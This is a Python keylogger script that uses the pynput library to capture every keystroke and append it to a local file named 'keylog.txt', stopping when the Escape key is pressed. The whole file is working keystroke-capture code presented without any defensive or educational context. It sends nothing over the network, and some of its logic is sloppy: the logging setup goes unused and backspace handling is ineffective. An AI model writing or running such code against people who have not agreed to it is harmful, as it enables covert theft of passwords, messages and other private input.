# Import required libraries
import logging
from pynput import keyboard
import threading

# Define log file name
log_file = "keylog.txt"

# Configure logging to save keystrokes in a file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Store logged keys in a variable
log = ""

# Function to save logs periodically
def save_log():
    global log
    if log:
        with open(log_file, "a") as f:
            f.write(log)
        log = ""  # Clear the log buffer
    threading.Timer(10, save_log).start()  # Save logs every 10 seconds

# Function to capture key presses
def on_press(key):
    global log
    ignored_keys = [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.shift]
    
    if key in ignored_keys:
        return  # Ignore these keys

    try:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        else:
            log += key.char
    except AttributeError:
        log += f" [{key.name}] "

    with open(log_file, "a") as f:
        f.write(log)
    log = ""


# Function to stop KeyLogger when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the listener

# Start the KeyLogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    save_log()  # Start saving logs periodically
    listener.join()
    
